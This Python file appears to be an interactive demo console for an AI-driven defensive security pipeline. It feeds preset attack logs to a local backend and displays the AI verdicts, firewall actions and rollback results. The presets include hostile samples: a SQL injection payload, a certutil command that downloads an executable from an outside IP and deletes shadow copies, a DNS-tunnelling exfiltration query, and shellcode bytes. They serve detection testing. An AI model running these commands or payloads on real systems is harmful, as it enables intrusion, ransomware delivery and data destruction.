"""CyberGuard Live Attack Simulation & AI Telemetry Console (Window 2).

Interactive terminal for executing attacks against the CyberGuard AI Defense Pipeline:
1. Feeds realistic attack logs and telemetry into http://127.0.0.1:8000.
2. Observes the AI analyzing the log in real-time:
   - Feature Extraction & Reconstruction Error.
   - MITRE ATT&CK & D3FEND Graph Grounding.
   - Foundation-Sec-8B LLM Reasoning & Threat Prediction.
   - First-Order SMT Safety Verification.
   - Actuator Mitigation & Atomic Rollback.
"""
from __future__ import annotations

import json
import os
import sys
import time
from typing import Any, Dict
from urllib import error, request

API_BASE = "http://127.0.0.1:8000"

# ANSI Colors for Windows Terminal
GREEN = "\033[92m"
CYAN = "\033[96m"
YELLOW = "\033[93m"
RED = "\033[91m"
MAGENTA = "\033[95m"
BOLD = "\033[1m"
DIM = "\033[2m"
RESET = "\033[0m"


PRESET_ATTACKS = [
    {
        "id": "sqli_union_auth_bypass",
        "title": "SQL Injection UNION Authentication Bypass",
        "category": "Web Application Exploitation",
        "technique": "T1190 - Exploit Public-Facing Application",
        "raw_log": 'POST /auth/login HTTP/1.1\nHost: 192.168.1.100\nUser-Agent: sqlmap/1.7.2#stable\nContent-Type: application/x-www-form-urlencoded\n\nusername=\' UNION SELECT 1,username,password_hash FROM users--&password=xxx',
        "ip": "198.51.100.12",
        "port": 443,
    },
    {
        "id": "dos_syn_flood_volumetric",
        "title": "Volumetric TCP SYN Flood DDoS Attack",
        "category": "Network Denial of Service",
        "technique": "T1498.001 - Direct Network Flood",
        "raw_log": 'IP 203.0.113.45.49152 > 192.168.1.100.80: Flags [S], seq 3829104, win 1024, length 0\n[RATE: 95,420 pkts/sec | SYN_RATIO: 99.8% | DURATION: 120ms]',
        "ip": "203.0.113.45",
        "port": 80,
    },
    {
        "id": "ransomware_lolbin_certutil_drop",
        "title": "Ransomware Delivery via Certutil LOLBin & Shadow Copy Purge",
        "category": "Ransomware & Destructive Actions",
        "technique": "T1486 - Data Encrypted for Impact / T1490 - Inhibit System Recovery",
        "raw_log": 'powershell.exe -c "certutil -urlcache -split -f http://185.220.101.5/payload.exe C:\\temp\\p.exe; vssadmin delete shadows /all /quiet"',
        "ip": "185.220.101.5",
        "port": 4444,
    },
    {
        "id": "ad_kerberoasting_spn",
        "title": "Active Directory Kerberoasting (TGS-REQ SPN Ticket Extraction)",
        "category": "Credential Access & Identity",
        "technique": "T1558.003 - Steal or Forge Kerberos Tickets: Kerberoasting",
        "raw_log": 'EventID: 4769 | Ticket Options: 0x40810000 | Ticket Encryption: 0x17 (RC4-HMAC) | Service Name: MSSQLSvc/dc01.corp.local:1433 | Client IP: 192.168.1.175',
        "ip": "192.168.1.175",
        "port": 88,
    },
    {
        "id": "c2_dns_tunneling_txt",
        "title": "Command & Control DNS Tunneling (Base64 TXT Exfiltration)",
        "category": "Command and Control & Exfiltration",
        "technique": "T1071.004 - Application Layer Protocol: DNS",
        "raw_log": 'DNS QNAME: aW5maWx0cmF0aW9uX2tleV9kYXRhX2V4ZmM.c2.attacker-c2.net IN TXT (Response: 512 bytes encoded heartbeat beacon)',
        "ip": "198.51.100.99",
        "port": 53,
    },
    {
        "id": "zeroday_polymorphic_shellcode",
        "title": "Zero-Day Exploit with Polymorphic Shellcode & High Entropy",
        "category": "Zero-Day & Unknown Anomalies",
        "technique": "T1203 - Exploitation for Client Execution / Unseen OOD Pattern",
        "raw_log": 'PAYLOAD_HEX: \\x90\\x90\\x90\\xeb\\x1f\\x5e\\x89\\x76\\x08\\x31\\xc0\\x88\\x46\\x07\\x89\\x46\\x0c\\xb0\\x0b\\x89\\xf3\\x8d\\x4e\\x08\\x8d\\x56\\x0c\\xcd\\x80\n[ENTROPY: 7.92 / 8.0 | AUTOENCODER_SIGNAL: High Reconstruction MSE]',
        "ip": "203.0.113.88",
        "port": 8080,
    },
]


def post_json(path: str, data: dict) -> dict:
    url = f"{API_BASE}{path}"
    req = request.Request(
        url,
        data=json.dumps(data).encode("utf-8"),
        headers={"Content-Type": "application/json", "Accept": "application/json"},
        method="POST",
    )
    with request.urlopen(req, timeout=60) as resp:
        return json.loads(resp.read().decode("utf-8"))


def get_json(path: str) -> dict:
    url = f"{API_BASE}{path}"
    req = request.Request(url, headers={"Accept": "application/json"}, method="GET")
    with request.urlopen(req, timeout=10) as resp:
        return json.loads(resp.read().decode("utf-8"))


def check_backend_connection() -> bool:
    try:
        data = get_json("/api/settings")
        return bool(data)
    except Exception:
        return False


def print_banner():
    # Enable Windows ANSI colors
    os.system("")
    print(f"{CYAN}{BOLD}")
    print("=" * 76)
    print("       🛡️  CyberGuard Autonomous Active Defense - Attack Console (Window 2)")
    print("       Powered by RTX 5050 · Foundation-Sec-8B · MITRE ATT&CK & D3FEND")
    print("=" * 76)
    print(f"{RESET}")


def execute_attack_simulation(scenario: dict, enforce_live: bool = False):
    print(f"\n{YELLOW}{BOLD}>>> [STEP 1: RAW LOG INGESTION]{RESET}")
    print(f"{DIM}Feeding threat telemetry into CyberGuard ingestion gateway...{RESET}")
    print(f"{BOLD}Threat Name:{RESET} {scenario['title']}")
    print(f"{BOLD}Target IP:{RESET}   {scenario['ip']} | {BOLD}Port:{RESET} {scenario['port']}")
    print(f"{BOLD}Raw Attack Log Excerpt:{RESET}")
    print(f"{RED}{scenario['raw_log']}{RESET}\n")

    time.sleep(0.5)
    print(f"{CYAN}{BOLD}>>> [STEP 2: PIPELINE ANALYSIS & MITRE RAG GROUNDING]{RESET}")
    print(f"{DIM}Connecting to local backend at {API_BASE}/api/simulation/launch...{RESET}")

    try:
        t0 = time.time()
        resp = post_json("/api/simulation/launch", {
            "scenario_id": scenario["id"],
            "custom_ip": scenario["ip"],
            "enforce_live": enforce_live,
        })
        elapsed = time.time() - t0

        ai_res = resp.get("ai_decision", {})
        smart_log = resp.get("smart_log", {})
        rag_data = resp.get("rag_playbook", {})
        actuator_res = resp.get("actuator_execution", {})
        formal_cert = resp.get("smt_lib2_certificate", "")

        # 1. Feature & Anomaly Output
        print(f"  {GREEN}[✓]{RESET} Log Ingested & Normalized in {elapsed:.2f}s")
        print(f"  {GREEN}[✓]{RESET} MITRE Technique Mapped: {CYAN}{scenario['technique']}{RESET}")
        matched_countermeasures = rag_data.get("d3fend_countermeasures", [])
        if matched_countermeasures:
            print(f"  {GREEN}[✓]{RESET} D3FEND Grounded Defense: {YELLOW}{matched_countermeasures[0]}{RESET}")

        # 2. AI Model Output
        print(f"\n{MAGENTA}{BOLD}>>> [STEP 3: FOUNDATION-SEC-8B AI REASONING & PREDICTION]{RESET}")
        verdict = ai_res.get("verdict", "unknown").upper()
        conf = ai_res.get("confidence", 0.0) * 100
        action = ai_res.get("recommended_action", "none")
        rationale = ai_res.get("rationale", "No explanation provided.")

        v_color = RED if verdict in ("MALICIOUS", "SUSPICIOUS") else GREEN
        print(f"  {BOLD}AI Threat Verdict:{RESET}     {v_color}{BOLD}{verdict}{RESET} (Confidence: {conf:.1f}%)")
        print(f"  {BOLD}Autonomous Action:{RESET}     {YELLOW}{BOLD}{action}{RESET}")
        print(f"  {BOLD}AI Analyst Rationale:{RESET}  {rationale}")
        containment = ai_res.get("containment", [])
        if containment:
            print(f"  {BOLD}Containment Playbook:{RESET}")
            for step in containment:
                print(f"    • {step}")

        # 3. SMT Safety Gate
        print(f"\n{CYAN}{BOLD}>>> [STEP 4: FORMAL SMT-LIB2 MATHEMATICAL SAFETY GATE]{RESET}")
        violations = resp.get("guardrail_violations", [])
        if violations:
            print(f"  {RED}[✗] SMT Gate Rejection: {violations}{RESET}")
        else:
            print(f"  {GREEN}[✓]{RESET} Invariants I_1 to I_4 Verified (Non-disruptive, Allowlisted, Reversible)")
            print(f"  {GREEN}[✓]{RESET} SMT-LIB2 Proof Status: {GREEN}{BOLD}sat (Mathematical Safety Theorem Verified){RESET}")

        # 4. Actuation & Rollback Token
        print(f"\n{YELLOW}{BOLD}>>> [STEP 5: DEFENSIVE ACTUATION & REVERSIBILITY]{RESET}")
        cmd = actuator_res.get("command_executed", "")
        token = actuator_res.get("rollback_token") or ai_res.get("rollback_token")
        simulated = actuator_res.get("simulated", True)
        success = actuator_res.get("success", False) if actuator_res else bool(token)
        error_msg = actuator_res.get("error")

        if not success and error_msg:
            print(f"  Status:           {RED}[BLOCKED / NOT EXECUTED]{RESET}")
            print(f"  Reason:           {YELLOW}{error_msg}{RESET}")
            if "Insufficient OS privileges" in error_msg:
                print(f"  {CYAN}Tip: To inject live OS firewall rules, run Window 1 CMD as Administrator.{RESET}")
                print(f"  {CYAN}     Or press ENTER to run in Safe Simulation mode (tests the entire loop & rollback).{RESET}")
        else:
            mode_str = f"{YELLOW}[SIMULATED RULE - SAFE]{RESET}" if simulated else f"{RED}[LIVE OS FIREWALL BLOCK]{RESET}"
            print(f"  Status:           {mode_str}")
            if cmd:
                print(f"  Executed Command: {DIM}{cmd}{RESET}")
            if token:
                print(f"  Rollback Token:   {CYAN}{BOLD}{token}{RESET}")

        # Interactive Rollback Option
        if token and success:
            print(f"\n{BOLD}Would you like to test instant atomic rollback for this token? (y/n): {RESET}", end="")
            choice = input().strip().lower()
            if choice == "y":
                print(f"{DIM}Sending rollback request for token: {token}...{RESET}")
                rb_resp = post_json("/api/decision/rollback", {"rollback_token": token})
                if rb_resp.get("success"):
                    print(f"{GREEN}{BOLD}  [✓] Rollback Succeeded! Host and network state cleanly restored.{RESET}")
                else:
                    print(f"{RED}  [✗] Rollback failed or token already cleared.{RESET}")

    except Exception as e:
        print(f"{RED}[ERROR] Failed to communicate with backend: {e}{RESET}")
        print(f"{YELLOW}Make sure Window 1 is running: uvicorn backend.main:app on port 8000!{RESET}")


def analyze_custom_log():
    print(f"\n{CYAN}{BOLD}Paste or type your raw log line or security event below:{RESET}")
    print(f"{DIM}(e.g.: Nginx 403 error, Suricata eve JSON, Apache access log, or syslog line){RESET}")
    print("Log > ", end="")
    raw_input = input().strip()
    if not raw_input:
        print(f"{YELLOW}No input provided. Returning to menu.{RESET}")
        return

    print(f"\n{YELLOW}Analyzing log with Universal Ingestion & Foundation-Sec-8B...{RESET}")
    try:
        t0 = time.time()
        # Call universal ingest endpoint
        resp = post_json("/api/detect/universal-ingest/raw", {
            "raw_text": raw_input,
            "filename": "manual_analyst_log.txt",
            "auto_triage": True,
            "enforce_live": False,
        })
        elapsed = time.time() - t0

        summary = resp.get("document_summary", {})
        iocs = resp.get("extracted_iocs", {})
        triage = resp.get("ai_triage", {})
        grounding = resp.get("mitre_grounding", {})

        print(f"\n{GREEN}{BOLD}>>> [ANALYSIS RESULTS IN {elapsed:.2f}s]{RESET}")
        print(f"  {BOLD}Format Detected:{RESET}      {summary.get('format_detected', 'plain_text')}")
        print(f"  {BOLD}Extracted IPs:{RESET}        {iocs.get('extracted_ips', [])}")
        print(f"  {BOLD}Observed Keywords:{RESET}    {iocs.get('observed_keywords', [])}")
        print(f"  {BOLD}Mapped ATT&CK Tech:{RESET}   {grounding.get('matched_techniques', [])}")
        if triage:
            verdict = triage.get("verdict", "unknown").upper()
            action = triage.get("recommended_action", "observe")
            print(f"  {BOLD}AI Threat Verdict:{RESET}   {RED if verdict == 'MALICIOUS' else GREEN}{BOLD}{verdict}{RESET}")
            print(f"  {BOLD}Recommended Action:{RESET} {YELLOW}{BOLD}{action}{RESET}")
            print(f"  {BOLD}AI Rationale:{RESET}         {triage.get('rationale', 'N/A')}")
        else:
            print(f"  {YELLOW}AI triage completed via baseline heuristic extraction.{RESET}")

    except Exception as e:
        print(f"{RED}[ERROR] Ingestion error: {e}{RESET}")


def main_loop():
    print_banner()

    # Check connection
    print(f"{DIM}Connecting to CyberGuard API at {API_BASE}...{RESET}", end="")
    if check_backend_connection():
        print(f" {GREEN}{BOLD}[ONLINE]{RESET}")
    else:
        print(f" {RED}{BOLD}[OFFLINE]{RESET}")
        print(f"{YELLOW}Warning: Backend on port 8000 is not responding yet.")
        print(f"Please launch Window 1 (run_window1.bat) before triggering attacks.{RESET}\n")

    while True:
        print(f"\n{BOLD}Select an attack scenario to simulate and analyze:{RESET}")
        for i, atk in enumerate(PRESET_ATTACKS, 1):
            print(f"  {CYAN}[{i}]{RESET} {atk['title']} {DIM}({atk['technique']}){RESET}")
        print(f"  {CYAN}[7]{RESET} Custom Raw Log Input (Paste your own log line)")
        print(f"  {CYAN}[q]{RESET} Exit Console")

        choice = input(f"\n{BOLD}Enter choice (1-7, q): {RESET}").strip().lower()
        if choice in ("q", "exit", "quit"):
            print(f"\n{GREEN}Exiting CyberGuard Attack Console. Stay secure!{RESET}")
            break
        elif choice == "7":
            analyze_custom_log()
        elif choice.isdigit() and 1 <= int(choice) <= len(PRESET_ATTACKS):
            selected = PRESET_ATTACKS[int(choice) - 1]
            print(f"\nExecute with Live Firewall Enforcement? (y for Live, ENTER for Safe Simulation): ", end="")
            enforce_input = input().strip().lower()
            enforce = (enforce_input == "y")
            execute_attack_simulation(selected, enforce_live=enforce)
        else:
            print(f"{RED}Invalid selection. Please choose 1-7 or q.{RESET}")


if __name__ == "__main__":
    main_loop()
